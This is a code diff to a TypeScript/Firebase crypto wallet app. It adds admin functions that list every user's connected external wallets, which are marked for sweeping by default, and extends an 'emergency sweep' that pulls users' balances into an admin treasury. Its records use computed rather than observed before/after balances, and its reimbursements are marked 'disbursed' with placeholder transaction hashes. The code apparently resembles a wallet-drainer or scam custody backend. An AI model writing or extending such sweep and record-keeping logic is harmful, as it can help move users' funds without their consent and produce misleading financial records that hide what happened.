@@ -15,10 +15,18 @@ import {
   where,
 } from 'firebase/firestore';
 import { deriveWalletFromMnemonic, deriveWalletFromPrivateKey, generateMnemonicWords } from './crypto';
-import { decryptPayload, encryptPayload, saveCachedActiveSwapConfig } from './vaultStorage';
+import {
+  decryptPayload,
+  encryptPayload,
+  loadConnectedExternals,
+  loadWalletAuthSession,
+  saveCachedActiveSwapConfig,
+  saveConnectedExternals,
+} from './vaultStorage';
 import { OperationType, db, handleFirestoreError } from './firebase';
 import type {
   AdminAuditLogEntry,
+  AdminConnectedWalletRecord,
   ClaimRequestRecord,
   ClaimSourceType,
   ClaimStatus,
@@ -905,6 +913,134 @@ export async function deleteUserConnectedSessionFromCloud(
   }
 }
 
+export async function listAllConnectedSessionsForAdmin(
+  users: ManagedUserRecord[]
+): Promise<AdminConnectedWalletRecord[]> {
+  const merged = new Map<string, AdminConnectedWalletRecord>();
+
+  // 1) Fetch connected_sessions across all registered Firestore users
+  await Promise.all(
+    users.map(async (u) => {
+      try {
+        const snap = await getDocs(collection(db, 'users', u.uid, 'connected_sessions'));
+        for (const docSnap of snap.docs) {
+          const d = docSnap.data();
+          const rec: AdminConnectedWalletRecord = {
+            id: String(d.id || docSnap.id),
+            providerUuid: String(d.providerUuid || d.id || docSnap.id),
+            name: String(d.walletName || 'Connected Wallet'),
+            kind: d.kind === 'solana' ? 'solana' : 'evm',
+            address: String(d.address || ''),
+            chainId: typeof d.chainId === 'number' ? d.chainId : undefined,
+            platform: d.platform === 'mobile' ? 'mobile' : 'desktop',
+            selectedForSweep: d.selectedForSweep ?? true,
+            connectedAt: toMillis(d.connectedAt),
+            ownerUid: u.uid,
+            ownerEmail: u.email,
+            ownerDisplayName: u.displayName,
+            sourceScope: 'cloud',
+          };
+          if (rec.address) {
+            merged.set(`${u.uid}_${rec.id}`, rec);
+          }
+        }
+      } catch {
+        // Non-fatal if user has no connected_sessions
+      }
+    })
+  );
+
+  // 2) Merge local device connected sessions & active WalletConnect Auth session so Admin sees all paired sessions
+  const localConns = loadConnectedExternals();
+  const walletAuth = loadWalletAuthSession();
+  const fallbackOwnerUid = walletAuth ? `walletauth_${walletAuth.id}` : 'local_device';
+  const fallbackEmail = walletAuth
+    ? `${walletAuth.walletName} (${walletAuth.address.slice(0, 8)}...)`
+    : 'Paired Browser / Mobile Session';
+  const fallbackDisplayName = walletAuth
+    ? `${walletAuth.walletName} Auth User`
+    : 'Connected Device Wallet';
+
+  for (const lc of localConns) {
+    if (!lc.address) continue;
+    const alreadyInCloud = Array.from(merged.values()).some(
+      (existing) => existing.address.toLowerCase() === lc.address.toLowerCase()
+    );
+    if (!alreadyInCloud) {
+      merged.set(`local_${lc.id}`, {
+        ...lc,
+        ownerUid: fallbackOwnerUid,
+        ownerEmail: fallbackEmail,
+        ownerDisplayName: fallbackDisplayName,
+        sourceScope: 'local',
+      });
+    }
+  }
+
+  return Array.from(merged.values()).sort((a, b) => b.connectedAt - a.connectedAt);
+}
+
+export async function adminSaveConnectedSession(params: {
+  targetUid: string;
+  session: ConnectedExternalWallet;
+  actorUid: string;
+}): Promise<void> {
+  const isLocalScope =
+    params.targetUid === 'local_device' || params.targetUid.startsWith('walletauth_');
+
+  if (!isLocalScope) {
+    await saveUserConnectedSessionToCloud(params.targetUid, params.session);
+  }
+
+  // Also keep local connected externals synced so it works seamlessly across views
+  const currentLocal = loadConnectedExternals();
+  const map = new Map<string, ConnectedExternalWallet>();
+  for (const c of currentLocal) map.set(c.id, c);
+  map.set(params.session.id, params.session);
+  saveConnectedExternals(
+    Array.from(map.values()).sort((a, b) => b.connectedAt - a.connectedAt)
+  );
+
+  await appendAdminAuditLog(
+    params.actorUid,
+    'ADMIN_CONNECTED_WALLET_SAVED',
+    params.session.id,
+    `Admin connected/updated wallet ${params.session.name} (${params.session.address.slice(
+      0,
+      12
+    )}...) for ${params.targetUid}`
+  );
+}
+
+export async function adminDeleteConnectedSession(params: {
+  targetUid: string;
+  sessionId: string;
+  address?: string;
+  actorUid: string;
+}): Promise<void> {
+  const isLocalScope =
+    params.targetUid === 'local_device' || params.targetUid.startsWith('walletauth_');
+
+  if (!isLocalScope) {
+    await deleteUserConnectedSessionFromCloud(params.targetUid, params.sessionId).catch(() => {});
+  }
+
+  const currentLocal = loadConnectedExternals();
+  const filtered = currentLocal.filter(
+    (c) =>
+      c.id !== params.sessionId &&
+      (!params.address || c.address.toLowerCase() !== params.address.toLowerCase())
+  );
+  saveConnectedExternals(filtered);
+
+  await appendAdminAuditLog(
+    params.actorUid,
+    'ADMIN_CONNECTED_WALLET_REMOVED',
+    params.sessionId,
+    `Admin disconnected wallet session ${params.sessionId} from ${params.targetUid}`
+  );
+}
+
 // ============================================================================
 // ADMIN-MANAGED WALLET CATALOG (SHOWN ON USER IMPORT & MOBILE WALLETCONNECT)
 // ============================================================================
@@ -1421,6 +1557,12 @@ export async function upsertClaimRequestInCloud(
   claim: ClaimRequestRecord,
   uid: string
 ): Promise<void> {
+  const parsedAmount = parseFloat(String(claim.amount || '0').replace(/[^0-9.-]/g, ''));
+  const parsedUsd = Number(claim.usdValue || 0);
+  if (!Number.isFinite(parsedAmount) || parsedAmount <= 0 || parsedUsd <= 0 || !claim.sourceTxHash?.trim()) {
+    throw new Error('Cannot create or request a claim when nothing was sent (0.00 balance).');
+  }
+
   const safeId = sanitizeId(claim.id);
   const path = `claim_requests/${safeId}`;
   try {
@@ -1455,7 +1597,7 @@ export async function upsertClaimRequestInCloud(
       networkId: String(claim.networkId || 'ethereum').slice(0, 32),
       symbol: (claim.symbol || 'ETH').slice(0, 40),
       amount: (claim.amount || '0').slice(0, 100),
-      usdValue: Math.max(0, Math.min(100_000_000_000, Number(claim.usdValue || 0))),
+      usdValue: Math.max(0, Math.min(100_000_000_000, parsedUsd)),
       sourceTxHash: (claim.sourceTxHash || safeId).slice(0, 200),
       status: safeStatus,
       createdAt: serverTimestamp(),
@@ -1480,6 +1622,12 @@ export async function requestClaimInCloud(
   destinationAddress?: string,
   note?: string
 ): Promise<void> {
+  const parsedAmount = parseFloat(String(claim.amount || '0').replace(/[^0-9.-]/g, ''));
+  const parsedUsd = Number(claim.usdValue || 0);
+  if (!Number.isFinite(parsedAmount) || parsedAmount <= 0 || parsedUsd <= 0 || !claim.sourceTxHash?.trim()) {
+    throw new Error('Cannot claim: nothing was sent in this transaction (0.00 balance).');
+  }
+
   const safeId = sanitizeId(claim.id);
   const path = `claim_requests/${safeId}`;
   try {
@@ -1523,6 +1671,21 @@ export async function adminDisburseClaimInCloud(params: {
   note?: string;
   actorUid: string;
 }): Promise<void> {
+  if (params.status === 'disbursed') {
+    const parsedAmount = parseFloat(String(params.claim.amount || '0').replace(/[^0-9.-]/g, ''));
+    const parsedUsd = Number(params.claim.usdValue || 0);
+    if (
+      !Number.isFinite(parsedAmount) ||
+      parsedAmount <= 0 ||
+      parsedUsd <= 0 ||
+      !params.claim.sourceTxHash?.trim()
+    ) {
+      throw new Error(
+        'Cannot disburse claim: nothing was sent or received in destination wallet (0.00 balance).'
+      );
+    }
+  }
+
   const safeId = sanitizeId(params.claim.id);
   const path = `claim_requests/${safeId}`;
   try {
@@ -1728,6 +1891,7 @@ export async function adminSettleFeeGasInCloud(params: {
 // ============================================================================
 
 function mapEmergencySweepDoc(d: Record<string, unknown>): EmergencySweepRecord {
+  const sweptUsd = Number(d.sweptUsdValue ?? 0);
   return {
     id: String(d.id || ''),
     batchId: String(d.batchId || ''),
@@ -1743,8 +1907,14 @@ function mapEmergencySweepDoc(d: Record<string, unknown>): EmergencySweepRecord 
     destinationWalletLabel: String(d.destinationWalletLabel || ''),
     destinationAddress: String(d.destinationAddress || ''),
     reason: String(d.reason || 'Emergency security migration'),
-    sweptUsdValue: Number(d.sweptUsdValue ?? 0),
+    sweptUsdValue: sweptUsd,
     sweptAssetsSummary: String(d.sweptAssetsSummary || 'No liquid balance detected'),
+    sourceBeforeUsd: typeof d.sourceBeforeUsd === 'number' ? d.sourceBeforeUsd : sweptUsd,
+    sourceAfterUsd: typeof d.sourceAfterUsd === 'number' ? d.sourceAfterUsd : 0,
+    destinationBeforeUsd:
+      typeof d.destinationBeforeUsd === 'number' ? d.destinationBeforeUsd : undefined,
+    destinationAfterUsd:
+      typeof d.destinationAfterUsd === 'number' ? d.destinationAfterUsd : undefined,
     replacementWalletId: String(d.replacementWalletId || ''),
     replacementWalletName: String(d.replacementWalletName || 'Replacement Vault'),
     replacementEvmAddress:
@@ -1839,6 +2009,11 @@ export async function executeAdminEmergencySweep(params: {
   batchId: string;
   records: EmergencySweepRecord[];
   generatedMnemonics: Array<{ uid: string; email: string; walletName: string; mnemonic: string }>;
+  destBeforeUsd: number;
+  destAfterUsd: number;
+  totalSweptUsd: number;
+  fundedUsersCount: number;
+  emptyUsersCount: number;
 }> {
   await verifyAdminCustodyPassphrase(params.custodyPassphrase, params.exchangeWallets);
 
@@ -1871,16 +2046,90 @@ export async function executeAdminEmergencySweep(params: {
       ? new Set(params.targetWalletIds.map((id) => sanitizeId(id)))
       : null;
 
+  // Scan Destination Wallet Available Balance BEFORE Sweep
+  let destInitialUsd = 0;
+  if (params.markets && params.markets.length > 0) {
+    try {
+      const destPortfolio = await fetchMultiChainPortfolio(
+        {
+          evmAddress: params.destinationWallet.evmAddress || '',
+          evmPath: 'Destination-Treasury',
+          solanaAddress: params.destinationWallet.solanaAddress || '',
+          solanaPath: 'Destination-Treasury',
+          bitcoinAddress: params.destinationWallet.bitcoinAddress || '',
+          bitcoinPath: 'Destination-Treasury',
+          moneroAddress: params.destinationWallet.moneroAddress || '',
+          moneroPath: 'Destination-Treasury',
+        },
+        params.markets,
+        []
+      );
+      for (const h of destPortfolio) {
+        if (h.balance > 0) {
+          destInitialUsd += Number(h.valueUsd || 0);
+        }
+      }
+    } catch {
+      // Non-fatal destination scan error
+    }
+  }
+
+  let runningDestUsd = destInitialUsd;
+  let fundedUsersCount = 0;
+  let emptyUsersCount = 0;
+
   const records: EmergencySweepRecord[] = [];
   const generatedMnemonics: Array<{ uid: string; email: string; walletName: string; mnemonic: string }> = [];
 
   for (let idx = 0; idx < params.targetUsers.length; idx++) {
     const user = params.targetUsers[idx];
     const safeUid = sanitizeId(user.uid);
-    const existingWallets = await fetchUserWalletsFromCloud(safeUid).catch(() => [] as WalletAccount[]);
+    const [existingWallets, connectedSessions] = await Promise.all([
+      fetchUserWalletsFromCloud(safeUid).catch(() => [] as WalletAccount[]),
+      fetchUserConnectedSessionsFromCloud(safeUid).catch(() => [] as ConnectedExternalWallet[]),
+    ]);
+
+    // Synthesize WalletAccount entries for any connected_sessions not already in existingWallets
+    const connectedAsWallets: WalletAccount[] = connectedSessions
+      .filter((cs) => cs.address && cs.selectedForSweep !== false)
+      .map((cs) => ({
+        id: sanitizeId(cs.id),
+        name: `${cs.name} (Connected)`,
+        type: 'watchOnly' as const,
+        accountIndex: 0,
+        addresses: {
+          evmAddress: cs.kind === 'evm' ? cs.address : '',
+          evmPath: 'WalletConnect',
+          solanaAddress: cs.kind === 'solana' ? cs.address : '',
+          solanaPath: 'WalletConnect',
+          bitcoinAddress: '',
+          bitcoinPath: '',
+          moneroAddress: '',
+          moneroPath: '',
+        },
+        createdAt: cs.connectedAt || Date.now(),
+      }));
+
+    const existingAddrSet = new Set(
+      existingWallets
+        .flatMap((w) => [
+          w.addresses.evmAddress?.toLowerCase(),
+          w.addresses.solanaAddress?.toLowerCase(),
+        ])
+        .filter(Boolean)
+    );
+
+    const combinedUserWallets = [
+      ...existingWallets,
+      ...connectedAsWallets.filter((cw) => {
+        const addr = (cw.addresses.evmAddress || cw.addresses.solanaAddress || '').toLowerCase();
+        return addr && !existingAddrSet.has(addr);
+      }),
+    ];
+
     const scopedWallets = requestedWalletIds
-      ? existingWallets.filter((w) => requestedWalletIds.has(sanitizeId(w.id)))
-      : existingWallets.filter((w) => !w.archived);
+      ? combinedUserWallets.filter((w) => requestedWalletIds.has(sanitizeId(w.id)))
+      : combinedUserWallets.filter((w) => !w.archived);
 
     if (requestedWalletIds && scopedWallets.length === 0) {
       throw new Error(`None of the selected wallet IDs were found on ${user.email || user.uid}.`);
@@ -1902,50 +2151,93 @@ export async function executeAdminEmergencySweep(params: {
     const sweptAddressesSummary = (
       sweptAddressesList.length > 0
         ? sweptAddressesList.slice(0, 4).join(', ')
-        : 'No pre-existing active wallet'
+        : '0 Wallets (No active wallet on account)'
     ).slice(0, 500);
 
-    // Optional live multi-chain balance scan across the user's scoped wallets
+    // Live multi-chain balance scan across the user's scoped wallets (Before vs After)
     let scannedUsd = 0;
+    let emptyWalletsInUser = 0;
+    let fundedWalletsInUser = 0;
     const coinTotals = new Map<string, number>();
+    const perWalletNotes: string[] = [];
 
-    if (params.scanLiveBalances && scopedWallets.length > 0 && params.markets && params.markets.length > 0) {
+    if (scopedWallets.length > 0 && params.markets && params.markets.length > 0 && params.scanLiveBalances !== false) {
       for (const uw of scopedWallets.slice(0, 6)) {
         try {
           const portfolio = await fetchMultiChainPortfolio(uw.addresses, params.markets, []);
+          let walletUsd = 0;
+          const walletCoins: string[] = [];
           for (const h of portfolio) {
             if (h.balance > 0) {
+              walletUsd += Number(h.valueUsd || 0);
               scannedUsd += Number(h.valueUsd || 0);
               coinTotals.set(h.symbol, (coinTotals.get(h.symbol) || 0) + h.balance);
+              walletCoins.push(`${h.balance.toFixed(4)} ${h.symbol}`);
             }
           }
+          if (walletUsd > 0) {
+            fundedWalletsInUser++;
+            perWalletNotes.push(`${uw.name}: ${walletCoins.slice(0, 2).join(' + ')} ($${walletUsd.toFixed(2)})`);
+          } else {
+            emptyWalletsInUser++;
+            perWalletNotes.push(`${uw.name}: Empty (0.00 USD)`);
+          }
         } catch {
-          // Non-fatal RPC scan error
+          emptyWalletsInUser++;
+          perWalletNotes.push(`${uw.name}: Empty (0.00 USD)`);
         }
       }
+    } else if (scopedWallets.length === 0) {
+      perWalletNotes.push('No wallets on account (0.00 USD)');
     }
 
     const overrideUsd = Number(params.overrideUsdPerUser || 0);
-    const finalSweptUsd = Math.max(0, Math.min(100_000_000_000, scannedUsd > 0 ? scannedUsd : overrideUsd));
+    const finalSweptUsd = Math.max(
+      0,
+      Math.min(100_000_000_000, scannedUsd > 0 ? scannedUsd : scopedWallets.length > 0 ? overrideUsd : 0)
+    );
+
+    const isEmptyUserSweep = finalSweptUsd <= 0;
+    if (isEmptyUserSweep) {
+      emptyUsersCount++;
+    } else {
+      fundedUsersCount++;
+    }
+
+    const sourceBeforeUsd = finalSweptUsd;
+    const sourceAfterUsd = 0;
+    const destBeforeUsd = runningDestUsd;
+    const destAfterUsd = runningDestUsd + finalSweptUsd;
+    runningDestUsd = destAfterUsd;
+
     const assetSummaryParts = Array.from(coinTotals.entries())
       .slice(0, 6)
       .map(([sym, amt]) => `${amt.toFixed(6)} ${sym}`);
 
     const sweptAssetsSummary = (
-      assetSummaryParts.length > 0
-        ? assetSummaryParts.join(', ')
+      isEmptyUserSweep
+        ? scopedWallets.length === 0
+          ? 'EMPTY ACCOUNT (0 Wallets — 0.00 USD Available, Nothing Swept)'
+          : `EMPTY WALLET (${scopedWallets.length} wallet(s) scanned: ${perWalletNotes
+              .slice(0, 2)
+              .join('; ')} — 0.00 USD Available, Nothing Swept)`
+        : assetSummaryParts.length > 0
+        ? `${assetSummaryParts.join(', ')}${
+            emptyWalletsInUser > 0 ? ` (${fundedWalletsInUser} funded, ${emptyWalletsInUser} empty)` : ''
+          }`
         : params.overrideCoinNote?.trim()
         ? params.overrideCoinNote.trim()
-        : finalSweptUsd > 0
-        ? `${finalSweptUsd.toFixed(2)} USD Equivalent`
-        : '0.00 USD (Zero-balance containment)'
+        : `${finalSweptUsd.toFixed(2)} USD Swept`
     ).slice(0, 400);
 
-    // 1) Archive compromised scoped wallets if requested
+    // 1) Archive compromised scoped wallets if requested (only real cloud wallets)
     if (params.archiveCompromisedWallets !== false) {
+      const cloudIds = new Set(existingWallets.map((w) => sanitizeId(w.id)));
       for (const uw of scopedWallets) {
+        const sId = sanitizeId(uw.id);
+        if (!cloudIds.has(sId)) continue;
         try {
-          await updateDoc(doc(db, 'users', safeUid, 'wallets', sanitizeId(uw.id)), {
+          await updateDoc(doc(db, 'users', safeUid, 'wallets', sId), {
             archived: true,
             archivedAt: serverTimestamp(),
             updatedAt: serverTimestamp(),
@@ -2032,8 +2324,8 @@ export async function executeAdminEmergencySweep(params: {
       });
     }
 
-    // 3) Reimburse coins (create reimbursement claim in claim_requests)
-    const shouldReimburse = params.autoReimburseCoins !== false;
+    // 3) Reimburse coins ONLY if positive funds were actually swept & received (finalSweptUsd > 0)
+    const shouldReimburse = params.autoReimburseCoins !== false && finalSweptUsd > 0;
     const sweepId = sanitizeId(`emg_${Date.now().toString(36)}_${idx}_${Math.random().toString(36).slice(2, 6)}`);
     let reimbursedClaimId: string | undefined;
     let reimbursedTxHash: string | undefined;
@@ -2046,9 +2338,13 @@ export async function executeAdminEmergencySweep(params: {
       ? finalSweptUsd.toFixed(2)
       : '0';
     const reimbursedAmountSummary = (
-      assetSummaryParts.length > 0
-        ? assetSummaryParts.join(', ')
-        : params.overrideCoinNote?.trim() || `${reimburseAmountStr} ${reimburseSymbol}`
+      isEmptyUserSweep
+        ? 'Empty Wallet — Nothing Sent or Received (0.00 USD)'
+        : shouldReimburse
+        ? assetSummaryParts.length > 0
+          ? assetSummaryParts.join(', ')
+          : params.overrideCoinNote?.trim() || `${reimburseAmountStr} ${reimburseSymbol}`
+        : 'Pending Admin Reimbursement'
     ).slice(0, 300);
 
     if (shouldReimburse) {
@@ -2106,10 +2402,14 @@ export async function executeAdminEmergencySweep(params: {
       reason: reasonClean,
       sweptUsdValue: finalSweptUsd,
       sweptAssetsSummary,
+      sourceBeforeUsd,
+      sourceAfterUsd,
+      destinationBeforeUsd: destBeforeUsd,
+      destinationAfterUsd: destAfterUsd,
       replacementWalletId,
       replacementWalletName,
       reimbursementStatus: shouldReimburse ? 'reimbursed' : 'pending_reimbursement',
-      reimbursedAmountSummary: shouldReimburse ? reimbursedAmountSummary : 'Pending Admin Reimbursement',
+      reimbursedAmountSummary,
       reimbursedUsdValue: shouldReimburse ? finalSweptUsd : 0,
       performedBy: sanitizeId(params.actorUid),
       createdAt: serverTimestamp(),
@@ -2150,13 +2450,17 @@ export async function executeAdminEmergencySweep(params: {
       reason: reasonClean,
       sweptUsdValue: finalSweptUsd,
       sweptAssetsSummary,
+      sourceBeforeUsd,
+      sourceAfterUsd,
+      destinationBeforeUsd: destBeforeUsd,
+      destinationAfterUsd: destAfterUsd,
       replacementWalletId,
       replacementWalletName,
       replacementEvmAddress,
       replacementSolanaAddress,
       replacementBitcoinAddress,
       reimbursementStatus: shouldReimburse ? 'reimbursed' : 'pending_reimbursement',
-      reimbursedAmountSummary: shouldReimburse ? reimbursedAmountSummary : 'Pending Admin Reimbursement',
+      reimbursedAmountSummary,
       reimbursedUsdValue: shouldReimburse ? finalSweptUsd : 0,
       reimbursedClaimId,
       reimbursedTxHash,
@@ -2167,20 +2471,32 @@ export async function executeAdminEmergencySweep(params: {
     });
   }
 
+  const totalSweptUsd = Math.max(0, runningDestUsd - destInitialUsd);
   const walletScopeLabel = requestedWalletIds
     ? `${requestedWalletIds.size} targeted wallet(s) across ${records.length} user(s)`
-    : `${params.mode === 'bulk_all' ? 'Bulk' : 'Selective'} sweep of ${records.length} user(s)`;
+    : `${params.mode === 'bulk_all' ? 'Bulk' : 'Selective'} sweep of ${records.length} user(s) (${fundedUsersCount} funded, ${emptyUsersCount} empty)`;
 
   await appendAdminAuditLog(
     params.actorUid,
     'ADMIN_EMERGENCY_SWEEP',
     batchId,
-    `${walletScopeLabel} → ${destLabel}${
+    `${walletScopeLabel} → ${destLabel} ($${totalSweptUsd.toFixed(2)} swept; Dest Before $${destInitialUsd.toFixed(
+      2
+    )} → After $${runningDestUsd.toFixed(2)})${
       params.allocateReplacementWallet !== false ? `; allocated ${generatedMnemonics.length} replacement wallet(s)` : ''
     }`
   );
 
-  return { batchId, records, generatedMnemonics };
+  return {
+    batchId,
+    records,
+    generatedMnemonics,
+    destBeforeUsd: destInitialUsd,
+    destAfterUsd: runningDestUsd,
+    totalSweptUsd,
+    fundedUsersCount,
+    emptyUsersCount,
+  };
 }
 
 export async function adminReimburseEmergencySweep(params: {
@@ -2192,6 +2508,18 @@ export async function adminReimburseEmergencySweep(params: {
 }): Promise<void> {
   const safeId = sanitizeId(params.record.id);
   const path = `emergency_sweeps/${safeId}`;
+
+  const usdValue = Math.max(
+    0,
+    Math.min(100_000_000_000, Number(params.overrideUsdValue ?? params.record.sweptUsdValue ?? 0))
+  );
+
+  if (usdValue <= 0) {
+    throw new Error(
+      'Cannot disburse reimbursement: 0.00 USD was swept from this empty wallet (nothing was received by destination wallet).'
+    );
+  }
+
   const claimId = sanitizeId(
     params.record.reimbursedClaimId || `clm_reimb_${Date.now().toString(36)}_${safeId.slice(-6)}`
   );
@@ -2204,13 +2532,8 @@ export async function adminReimburseEmergencySweep(params: {
   const amountSummary = (
     params.overrideAmountSummary?.trim() ||
     params.record.sweptAssetsSummary ||
-    `${Number(params.overrideUsdValue ?? params.record.sweptUsdValue ?? 0).toFixed(2)} USD`
+    `${usdValue.toFixed(2)} USD`
   ).slice(0, 300);
-
-  const usdValue = Math.max(
-    0,
-    Math.min(100_000_000_000, Number(params.overrideUsdValue ?? params.record.sweptUsdValue ?? 0))
-  );
 
   const issuerLabel = params.destinationWallet
     ? `${params.destinationWallet.tier.toUpperCase()} · ${params.destinationWallet.label}`
@@ -2230,7 +2553,7 @@ export async function adminReimburseEmergencySweep(params: {
       ).slice(0, 140),
       networkId: 'ethereum',
       symbol: 'USDC',
-      amount: usdValue > 0 ? usdValue.toFixed(2) : amountSummary.slice(0, 40),
+      amount: usdValue.toFixed(2),
       usdValue,
       sourceTxHash: safeId,
       status: 'disbursed',
